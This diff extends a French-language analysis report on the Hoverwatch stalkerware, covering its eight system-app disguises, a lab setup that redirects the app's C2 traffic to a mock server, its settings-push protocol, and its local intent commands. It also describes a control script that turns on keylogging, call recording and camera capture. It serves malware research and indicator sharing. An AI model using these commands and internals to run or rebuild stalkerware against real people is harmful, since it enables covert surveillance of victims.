@@ -15,6 +15,8 @@
 > - v1 — 2026-04-08 : analyse statique complète initiale
 > - v2 — 2026-04-20 (matin) : attribution Refog + pivot multi-brand Snoopza + correction clé DES + domaines C2 seedés binaires décryptés
 > - v3 — 2026-04-20 (après-midi) : décryption batch des 13 strings DES (canary `"refog"` in-binary, YouTube Kids caché), kill switch `C0744c`, format exfil multipart Apache HttpClient (PAS protobuf), schéma BDD IM `mpk_events`, flow `ActivityInstaller` (11 fragments / 18 modules togglables), correction confusion `user_type` JSON vs brand code URL
+> - v4 — 2026-04-21 (matin) : analyse dynamique Corellium, système de camouflage 8-déguisements (§23), setup lab Corellium + mock C2 (§24), zéro anti-VM confirmé, mapping noms réels JADX→manifest
+> - v5 — 2026-04-21 (après-midi) : diagnostic démarrage ServiceCore, bug `MOCK_DOMAINS` double port (§25), traçage complet du flow d'initialisation C2 — seed in-binary → registration → domain override, exfiltration live confirmée (logs + selfie), mécanisme de push settings via heartbeat + commandes ServiceCore (§26)
 
 ---
 
@@ -80,18 +82,21 @@
 
 ### 2.3 Activities
 
-| Classe | Rôle |
-|--------|------|
-| `ActivityMainStarter` | Launcher principal (excludeFromRecents=true) |
-| `ActivityDblStarter` | Double launcher (icône alternative) |
-| `ActivityMain` | Interface de contrôle |
-| `ActivityTrScr` | Activité transparente (overlay furtif, singleInstance, noHistory) |
-| `ActivityInstaller` | Assistant installation/configuration |
-| `ActivityWidget` | Widget anodin (point d'accès caché) |
+| Classe (manifest) | Classe (JADX) | Rôle |
+|----|--------|------|
+| `com.activities.ActivityMainStarter` | idem | Launcher principal → lance `ActivityMain` via `C0698a.m5190s(true)` (excludeFromRecents=true) |
+| `com.activities.ActivityDblStarter` | idem | Double launcher (icône alternative) |
+| `com.activities.ActivitySettingsStarter` | idem | Cover behavior : lance `android.settings.SETTINGS` puis `finish()` — ne lance PAS ActivityMain |
+| `com.activities.ActivityMain` | idem | Interface de contrôle — **point d'entrée réel**, détecte `APP_STATE_NOT_INSTALLED` → lance wizard |
+| `com.activities.ActivityTrScr` | idem | Activité transparente (overlay furtif, singleInstance, noHistory) |
+| `hw.installer.ActivityInstaller` | `p094hw.installer.ActivityInstaller` | Assistant installation/configuration (11 fragments) |
+| `com.activities.ActivityWidget` | idem | Widget anodin (point d'accès caché) |
 
 **Notes** :
 - `excludeFromRecents="true"` sur toutes les activités → invisible dans les apps récentes
 - Process séparé `:r` pour l'enregistrement audio → survie indépendante
+- **Noms JADX vs manifest** : JADX renomme le package `hw` en `p094hw`. Les classes sous `com.activities.*` gardent leur nom réel. Seules les classes `hw.*` sont préfixées (`p094hw.*`). Pour `am start`, utiliser le nom manifest (ex: `hw.installer.ActivityInstaller`, pas `p094hw.installer.ActivityInstaller`)
+- **Flow de lancement** : `ActivityMainStarter` → `C0698a.m5190s(true)` → `startActivity(ActivityMain.class)` → `ActivityMain.onCreate()` vérifie `C0895z.m6659o() == APP_STATE_NOT_INSTALLED` → `m4853P()` lance le wizard. Les autres Starters (Settings, Dbl) sont des **cover behaviors post-installation** qui ne lancent PAS le wizard
 
 ---
 
@@ -1165,6 +1170,153 @@ Retourne `true` si **encore quelque chose à configurer**. Tant que `true`, l'in
 
 ---
 
+## 23. Système de camouflage — 8 déguisements (v4 — 2026-04-21)
+
+### 23.1 Mécanisme
+
+Hoverwatch déclare dans son manifest **8 `<activity-alias>`** avec le filtre `MAIN/LAUNCHER`, chacun portant le label et l'icône d'une app système Android standard. À l'installation, les 8 apparaissent dans le launcher Android, provoquant un dialog "Complete Action Using" quand l'utilisateur clique.
+
+Les 8 déguisements observés sur Corellium :
+
+| # | Label affiché | App système usurpée |
+|---|---|---|
+| 1 | Settings | `com.android.settings` |
+| 2 | Calendar | Calendrier |
+| 3 | Camera | Caméra |
+| 4 | Clock | Horloge |
+| 5 | Contacts | Contacts |
+| 6 | Gallery | Galerie |
+| 7 | Messaging | SMS |
+| 8 | Phone | Téléphone |
+
+### 23.2 Comportement des Starters
+
+Les 3 activity-aliases dans le resolver table correspondent à 3 classes distinctes avec des comportements différents :
+
+| Classe | Comportement |
+|---|---|
+| `ActivityMainStarter` | **Seul point d'entrée valide** — `C0698a.m5190s(true)` → `startActivity(ActivityMain.class)` → détecte `NOT_INSTALLED` → lance wizard |
+| `ActivitySettingsStarter` | **Cover behavior** — `ActivityMain.m4857T()` (no-op si `f4746x == null`) + `startActivity("android.settings.SETTINGS")` + `finish()` → ouvre les vrais Settings |
+| `ActivityDblStarter` | Variante cover behavior |
+
+### 23.3 Flow normal d'installation (confirmé par reverse)
+
+1. L'attaquant sideloade l'APK
+2. Clique sur l'icône **principale** dans le launcher (`ActivityMainStarter`)
+3. `ActivityMain.onCreate()` détecte `APP_STATE_NOT_INSTALLED` → lance le wizard (`m4853P()`)
+4. Après le wizard, l'attaquant choisit un déguisement
+5. L'app désactive les autres aliases via `PackageManager.setComponentEnabledSetting()` → seul le déguisement choisi reste visible dans le launcher
+
+### 23.4 Piège Corellium
+
+Sur Corellium, le picker "Complete Action Using" montrait les 8 options. Choisir "Settings" lançait `ActivitySettingsStarter` → vrais Settings Android → aucun process `mntau` spawné → impression que l'app ne fonctionne pas. **Ce n'est pas un anti-VM** — c'est un mauvais choix dans le picker.
+
+### 23.5 Finding pour la thèse
+
+Pattern de camouflage par **usurpation d'identité système sélectionnable** : l'attaquant choisit l'identité de couverture au moment du setup. C'est différent de Mobile Tracker Free qui hardcode une seule identité ("System Service"). Hoverwatch offre 8 choix, augmentant la capacité d'adaptation au contexte du device victime (si Calendar est déjà présent, choisir Clock ; si Settings a une icône différente du thème, choisir Phone, etc.).
+
+### 23.6 Anti-VM / Anti-émulation : zéro
+
+Recherche exhaustive via JADX (search_classes_by_keyword) sur : `qemu`, `goldfish`, `corellium`, `isEmulator`, `SafetyNet`, `PlayIntegrity`, `Build.FINGERPRINT`, `Build.HARDWARE`, `Build.PRODUCT`, `Build.BOARD`, `Build.BRAND`, `/dev/socket`, `test-keys`, `ranchu`, `vbox`, `SystemProperties`, `getprop` — **tous 0 hits**.
+
+Seuls 3 usages bénins de `Build.MODEL`/`Build.MANUFACTURER` dans `C0884o` : chaîne de télémétrie, fallback "Android", sélection AudioSource Samsung/Huawei.
+
+DexDispatch confirme : 16 504 méthodes, **0 méthodes natives**, 0 native boundaries.
+
+---
+
+## 24. Analyse dynamique — Setup lab Corellium (v4 — 2026-04-21)
+
+### 24.1 Prérequis
+
+- VM Corellium Android (root, shell via console web ou adb over SSH)
+- Mock C2 FastAPI (`mock_c2/server.py`) sur le PC d'analyse
+- APK Hoverwatch `hoverwatch_20260420.apk`
+
+### 24.2 Connectivité VM → Mock C2
+
+**Problème** : pas de VPN (OpenVPN Windows ne supporte pas le mode TAP requis par Corellium). La VM ne peut pas joindre le PC directement.
+
+**Solution** : `adb reverse` via le tunnel SSH Corellium.
+
+Le port 443 est privilégié et `adb reverse tcp:443` retourne `Permission denied`. Contournement en deux étapes :
+
+```bash
+# 1. Côté PC — reverse port forwarding sur port non-privilégié
+adb reverse tcp:8443 tcp:8443
+
+# 2. Côté VM Corellium (shell root) — iptables redirige 443 → 8443
+iptables -t nat -A OUTPUT -p tcp -d 127.0.0.1 --dport 443 -j REDIRECT --to-port 8443
+```
+
+### 24.3 Redirection DNS
+
+Le filesystem root de Corellium est monté read-only (`/dev/root on / type ext4 (ro)`). Remontage :
+
+```bash
+mount -o rw,remount /
+echo "127.0.0.1 a.syncvch.com" >> /etc/hosts
+echo "127.0.0.1 i1.hoverwatch.com" >> /etc/hosts
+echo "127.0.0.1 hwa.cab" >> /etc/hosts
+mount -o ro,remount /
+```
+
+> **Note** : `/system` n'est pas dans `/proc/mounts` sur Corellium — utiliser `mount -o rw,remount /` (root directement).
+
+### 24.4 Lancement du mock C2
+
+```bash
+# Côté PC
+cd C:\Users\sebdr\workspace\stalkerwares_analyses\hoverwatch\mock_c2
+uv run uvicorn server:app --host 127.0.0.1 --port 8443 --ssl-keyfile mock.key --ssl-certfile mock.crt
+```
+
+L'app accepte le cert self-signed grâce au `TrustAllManager` (`C0740d` + `HostnameVerifier` retournant `true`) — pas besoin de Frida pour le SSL bypass.
+
+### 24.5 Vérification
+
+Depuis le shell Corellium :
+
+```bash
+curl -k https://a.syncvch.com:8443/
+# Doit retourner le JSON du dashboard mock C2 :
+# {"server":"Refog Mock C2 (Hoverwatch / Snoopza)","version":"2.0.0","status":"running",...}
+```
+
+### 24.6 Chemin réseau complet
+
+```
+App (Hoverwatch)  →  https://a.syncvch.com:443
+  → /etc/hosts      →  127.0.0.1:443
+  → iptables NAT    →  127.0.0.1:8443
+  → adb reverse     →  PC:8443
+  → mock C2 server  →  server.py (FastAPI/uvicorn)
+```
+
+### 24.7 Lancement de l'app
+
+```bash
+# Lancer le wizard directement (bypass les activity-aliases)
+am start -n com.android.core.mntau/hw.installer.ActivityInstaller
+
+# OU lancer via le flow normal (ActivityMain détecte NOT_INSTALLED → wizard)
+am start -n com.android.core.mntau/com.activities.ActivityMainStarter
+```
+
+> **Attention aux noms JADX** : `p094hw.installer.ActivityInstaller` est le nom JADX déobfusqué. Le vrai nom manifest est `hw.installer.ActivityInstaller`. Utiliser `dumpsys package com.android.core.mntau | grep Activity` pour retrouver les noms réels.
+
+### 24.8 Alternative : Frida hook
+
+Si le DNS spoofing ne suffit pas (rotation de domaines C2 après registration), le script `howerwatch.js` redirige les getters `z.x()` et `z.y()` et intercepte aussi la crypto DES + le kill switch :
+
+```bash
+frida -U -f com.android.core.mntan -l howerwatch.js --no-pause
+```
+
+Modifier `MOCK_C2_URL` dans le script avec `https://127.0.0.1:8443/`.
+
+---
+
 ## 16. Attribution & architecture multi-brand (v2 — 2026-04-20)
 
 ### 16.1 Attribution — Refog Inc.
@@ -1266,6 +1418,202 @@ Confirmation côté `jadx-mcp` : `search_classes_by_keyword("loadLibrary")` = 0,
 
 ---
 
+## 25. Bug `MOCK_DOMAINS` — double port après normalisation (v5)
+
+### 25.1 Symptôme
+
+`ServiceCore` démarre en FGS mais **aucun heartbeat ni exfiltration** n'atteint le mock C2 après la registration. La registration elle-même fonctionne, confirmant que le plumbing réseau (`/etc/hosts` + iptables 443→8443 + `adb reverse`) est fonctionnel.
+
+### 25.2 Cause racine
+
+Le normaliseur de domaines `C0895z.m6675w()` force le suffix `:443/` sur tout domaine qui ne le contient pas déjà :
+
+```java
+if (!strTrim.contains(":443/")) {
+    strTrim = strTrim.substring(0, strTrim.length() - 1);  // strip trailing /
+    strTrim = strTrim + ":443/";                            // append :443/
+}
+```
+
+L'ancien `MOCK_DOMAINS` renvoyait `https://127.0.0.1:8443/`. Ce string contient `:8443/` mais **pas** `:443/` (substring match). Le normaliseur :
+
+1. Strip le `/` final → `https://127.0.0.1:8443`
+2. Concatène `:443/` → **`https://127.0.0.1:8443:443/`** — URL invalide (double port)
+
+Tous les requests post-registration (heartbeat `/check/`, exfil `/logs/`) partaient vers cette URL → connexion échouée silencieusement.
+
+### 25.3 Pourquoi la registration fonctionnait
+
+La registration utilise le domaine **seed** (blob DES hardcodé dans le DEX, cf. §3.6.1), pas celui renvoyé par la réponse. Séquence :
+
+1. `CoreApplication.onCreate()` → `C0737a.m5328F()` → TskInit seed les domaines dans SharedPrefs
+2. Première requête HTTP : `f5120a` est vide → `C0895z.m6677x()` lit `domains` depuis SharedPrefs → `https://a.syncvch.com:443/`
+3. `/etc/hosts` résout → `127.0.0.1` → iptables → adb reverse → mock C2 → **registration OK**
+4. La réponse écrase `domains` dans SharedPrefs via `C0895z.m6657n()` avec les valeurs du mock
+5. Si le mock renvoie `127.0.0.1:8443` → normalisation casse l'URL → tous les requests suivants échouent
+
+### 25.4 Fix
+
+`server.py` : remplacement de `MOCK_DOMAINS` hardcodé `127.0.0.1:8443` par les vrais domaines C2 déchiffrés :
+
+```python
+MOCK_DOMAINS = (
+    "https://a.syncvch.com:443/;"
+    "https://i1.hoverwatch.com:443/;"
+    "https://hwa.cab:443/"
+)
+```
+
+Ces domaines contiennent déjà `:443/` → le normaliseur ne touche à rien → la même chaîne `/etc/hosts` + iptables fonctionne pour tous les requests.
+
+### 25.5 Findings annexes durant le diagnostic
+
+**Condition de démarrage `m6653j0()`** (flag "app active") :
+
+```java
+private static boolean m6653j0() {
+    return m6659o() == APP_STATE_INSTALLED   // AppInstState == 1
+        && m6681z()                           // EnableMonitor (default true)
+        && m6631T() >= 0;                     // ValidThrough - now + 7j >= 0
+}
+```
+
+- **`EnableMonitor`** : default `true` dans le getter `m6681z()`. Le setter `m6678x0(true)` ne persiste jamais la clé car `m6681z() != true` est `false` → guard condition skip l'écriture. La clé est donc **absente** des SharedPrefs mais fonctionnellement `true`. Pas un bug.
+- **`ValidThrough`** : set par la réponse de registration (`valid_through` JSON → `m6642Y0()` → `SimpleDateFormat("yyyy-MM-dd HH:mm:ss")`). Si absent (default 0), le check `m6631T() >= 0` échoue systématiquement → app inactive. Le mock C2 doit impérativement renvoyer un `valid_through` dans le futur.
+- **Variante SNPA** : `m6652i0()` utilise une condition relaxée (pas de check `ValidThrough`) si `C0870b0.f6028x == true` (build Snoopza).
+
+**Restriction FGS Android 13+** :
+
+```
+Foreground service started from background can not have location/camera/microphone access
+```
+
+Un FGS démarré depuis le background perd les permissions `WHILE_IN_USE` (GPS, micro, caméra). Contournement : lancer une activité Hoverwatch (`am start -n com.android.core.mntau/com.activities.ActivityMainStarter`) pour donner le contexte foreground avant le démarrage du service.
+
+### 25.6 Résultat
+
+Après fix, le mock C2 reçoit avec succès :
+- 86 exception parts (logs internes, confirmation seed domaines, init DB)
+- 44 log events (type 308 = événements système)
+- 1 selfie JPEG (type 317, 15 KB, sauvé dans `logs/raw/`)
+
+Exfiltration live fonctionnelle — le mock C2 capture désormais toutes les données volées par Hoverwatch.
+
+---
+
+## 26. Push de commandes depuis le C2 (v5)
+
+### 26.1 Pas de FCM
+
+Contrairement à la v7.5.369 (qui référençait 60+ commandes FCM), la v7.5.385 **n'embarque aucun code Firebase Messaging** (`FirebaseMessaging`, `onMessageReceived`, `GcmReceiver` = 0 hit). Le contrôle est entièrement **pull-based**.
+
+### 26.2 Mécanisme de settings push via heartbeat
+
+L'app envoie le header `x-settings-ver: {version}` dans chaque heartbeat `POST /api/online/check/`. Le flow de mise à jour :
+
+1. **`m5325C()`** (flow SEND_DATA, déclenché périodiquement ou via intent) appelle `m5351t()` avec le header `x-settings-ver`
+2. **`m5351t()`** (502 instructions, décompilation échouée) appelle `POST /api/online/check/` avec les headers custom
+3. Si la réponse contient un JSON avec `settings`, **`m6580n()`** est appelé
+4. **`m6580n()`** compare `settings.version` avec la version locale (`C0895z.m6623P()`)
+5. Si `server_ver > client_ver` : les settings sont appliqués module par module
+
+⚠️ **Attention** : il existe deux appels `/check/` distincts :
+- `m5350s()` — ping simple, ne parse **pas** le body JSON (log : `"HCl pcl: ok"`)
+- `m5351t()` — sync complet, parse le body JSON pour les settings (appelé via `m5325C`/SEND_DATA)
+
+Seul `m5351t()` traite les settings push. Le cycle SEND_DATA est déclenché toutes les `period` minutes (configurable via settings, default 10 min).
+
+### 26.3 Settings JSON — modules contrôlables
+
+Extrait de `m6580n()` (handler de settings dans `C0894y`) :
+
+| Clé JSON | Module | IDs internes |
+|---|---|---|
+| `on` | Master switch (`EnableMonitor`) | — |
+| `debug` | Mode debug | — |
+| `period` | Intervalle de sync (minutes) | — |
+| `onlyWiFi` | Exfiltration WiFi uniquement | — |
+| `showtab` | Afficher icône launcher | — |
+| `call.on` / `call.rec` / `call.quality` / `call.source` / `call.codec` / `call.gain` | Enregistrement d'appels | 312 |
+| `shot.on` / `shot.period` | Capture d'écran (MediaProjection) | 302 |
+| `location.on` / `location.period` / `location.acc` / `location.gps` | Géolocalisation | 314 |
+| `chat.on` | Interception IM (AccessibilityService) | 304 |
+| `sms.on` | Interception SMS | 313 |
+| `url.on` | Historique navigateur | 305 |
+| `frcam.on` / `frcam.photo` | Caméra frontale (selfie) | 317/319 |
+| `keys.on` | Keylogger | 301 |
+| `files.on` | Monitoring fichiers | — |
+| `app.on` | Usage apps | 307 |
+| `contact.on` | Contacts | 315 |
+| `calendar.on` | Calendrier | 316 |
+| `sim.on` | Monitoring SIM | — |
+
+La condition d'application : `settings.version > version_stockée_localement`. Le mock C2 incrémente automatiquement la version via `/admin/settings`.
+
+### 26.4 Commandes locales via Intent (ServiceCore)
+
+En parallèle des settings push, les commandes peuvent être injectées localement via `am start-foreground-service` :
+
+```
+am start-foreground-service -n com.android.core.mntau/hw.utils.ServiceCore --es INTENT_FUNC_KEY <CMD>
+```
+
+| Commande | Handler | Rôle |
+|---|---|---|
+| `INITIALIZE` | `C0624b` | Init complète (seed domaines, sync, lancement collecte) |
+| `SEND_DATA` | `C0737a.e` via `m5325C` | Force sync + exfiltration (déclenche `m5351t` → pull settings + upload) |
+| `SYNC_EVENTS` | `C0626d` | Sync des événements collectés |
+| `SYNC_HEAVY_EVENTS` | `C0627e` | Sync contacts, fichiers, apps, historique |
+| `MAKE_PHOTO` | `C0618g.a` | Photo selfie (caméra frontale, type 317) |
+| `MAKE_SCREENSHOT` | `C0619h.a` | Capture d'écran (MediaProjection, type 302) |
+| `WRITE_LOCATION` | `C0625c` | Force écriture GPS |
+| `CHECK_SIM` | `C0623a` | Vérification SIM |
+| `ENCODE` | `C0862i` | Encodage enregistrement audio |
+
+### 26.5 Outil de contrôle (`ctl.py`)
+
+Script Python (`mock_c2/ctl.py`) pour piloter le mock C2 sans souffrir de PowerShell :
+
+```bash
+uv run ctl.py screenshot --period 1   # activer screenshots
+uv run ctl.py photo                   # selfie caméra frontale
+uv run ctl.py location --period 1     # GPS précision max
+uv run ctl.py keylog                  # keylogger
+uv run ctl.py callrec                 # enregistrement appels
+uv run ctl.py chat / sms              # interception IM / SMS
+uv run ctl.py sync --period 1         # réduire intervalle sync
+uv run ctl.py off / on                # master switch
+uv run ctl.py kill [auth_key]         # kill switch (HTTP 410)
+uv run ctl.py status / devices / exfil # info
+```
+
+### 26.6 Flow de bout en bout validé (screenshot)
+
+```
+[PC] ctl.py screenshot --period 1
+  → POST /admin/settings {"shot": {"on": true, "period": 1}}
+  → DEFAULT_SETTINGS.version incrémenté (100 → 101)
+
+[Device] Cycle SEND_DATA (~10 min ou forcé via am ... SEND_DATA)
+  → m5325C() → m5351t(["x-settings-ver", "100"])
+  → POST /api/online/check/ (x-settings-ver: 100)
+
+[Mock C2] server_ver=101 > client_ver=100
+  → répond JSON avec settings {"shot": {"on": true, "period": 1}, "version": 101}
+
+[Device] m6580n() parse la réponse
+  → applique shot.on=true, persiste version=101
+  → MediaProjection capture l'écran (JPEG, type 302)
+  → POST /api/online/logs/ (multipart, attachment JPEG 93 KB)
+
+[Mock C2] reçoit le screenshot dans logs/raw/
+  → heartbeats suivants : settings-ver=101 (confirmé appliqué)
+```
+
+Confirmé fonctionnel le 21/04/2026 sur Corellium (Android 16, Hoverwatch 7.5.385).
+
+---
+
 ## 19. TODO
 
 ### Terminé
@@ -1290,13 +1638,23 @@ Confirmation côté `jadx-mcp` : `search_classes_by_keyword("loadLibrary")` = 0,
 - [x] **Schéma BDD messages IM** (`C0752h`/`C0751h`) — table `mpk_events`, structure `i`, dédup temporelle, rétention 300/conv — v3 (cf. §9.5)
 - [x] **Flow `ActivityInstaller`** — 11 fragments séquentiels, 18 modules togglables — v3 (cf. §22)
 - [x] **Anti-forensics logcat** — crash scraping + clearing via DES strings dans `C0878l$a` — v3 (cf. §21)
+- [x] **Système de camouflage** — 8 activity-aliases imitant des apps système (Settings, Calendar, Camera, Clock, Contacts, Gallery, Messaging, Phone), identité sélectionnable par l'attaquant — v4 (cf. §23)
+- [x] **Anti-VM / anti-émulation** — confirmé zéro détection (0 hit sur qemu/goldfish/corellium/SafetyNet/etc.) — v4 (cf. §23.6)
+- [x] **Setup lab Corellium** — adb reverse + iptables + /etc/hosts, tunnel vers mock C2 fonctionnel — v4 (cf. §24)
+- [x] **Mapping noms JADX → manifest** — `p094hw.*` = `hw.*` dans le manifest, `com.activities.*` inchangés — v4 (cf. §2.3)
+- [x] **Flow de lancement** — `ActivityMainStarter` → `ActivityMain` → wizard vs cover behaviors (Settings/Dbl) — v4 (cf. §23.2)
+
+- [x] **Diagnostic démarrage ServiceCore** — identification de la chaîne de conditions `m6653j0()` = `AppInstState==INSTALLED && EnableMonitor && ValidThrough+7j>=0`. `EnableMonitor` a un default `true` (jamais persisté car le setter skip quand la valeur ne change pas). Le vrai blocker était `MOCK_DOMAINS` → voir §25 — v5
+- [x] **Exfiltration live confirmée** — 86 exception parts + 44 log events + selfie JPEG (type 317) reçus par le mock C2 — v5
+- [x] **Mécanisme de push settings** — pull-based via heartbeat `/check/` (pas de FCM dans la 385), handler `m6580n()`, 18 modules contrôlables, screenshot (type 302) confirmé de bout en bout, `ctl.py` créé — v5 (cf. §26)
 
 ### À faire
 
-- [ ] **Mettre à jour le mock C2 server** (`mock_c2/`) avec les findings v3 :
+- [x] **Mettre à jour le mock C2 server** (`mock_c2/`) avec les findings v3 :
   - format multipart au lieu de protobuf
   - parts nommées `log%04d` / `exception%04d`
   - support des deux brands (header `X-Auth-Key`, path `programversion/{HWA|SNPA}/`)
+  - **fix v5** : `MOCK_DOMAINS` remplacé par vrais domaines C2 (`a.syncvch.com`, `i1.hoverwatch.com`, `hwa.cab`) — l'ancien `127.0.0.1:8443` causait un double port après normalisation `m6675w()` → zéro heartbeat post-registration
   - tests Suricata/Snort signatures
 - [ ] **Passive DNS / certs TLS** sur les 6 domaines C2 (`a.syncvch.com`, `i1.hoverwatch.com`, `hwa.cab`, `snsync.com`, `app.snoopza.com`, `api.snoopza.com`) — corrélation infra Snoopza↔Hoverwatch via Validin/SecurityTrails/DomainTools
 - [ ] **PR upstream AssoEchap/stalkerware-indicators** avec les 4 nouveaux IOCs (`a.syncvch.com`, `hwa.cab`, `snsync.com`, `app.snoopza.com`) + clarifier sous-domaines partiels (`i1.hoverwatch.com`, `api.snoopza.com`)
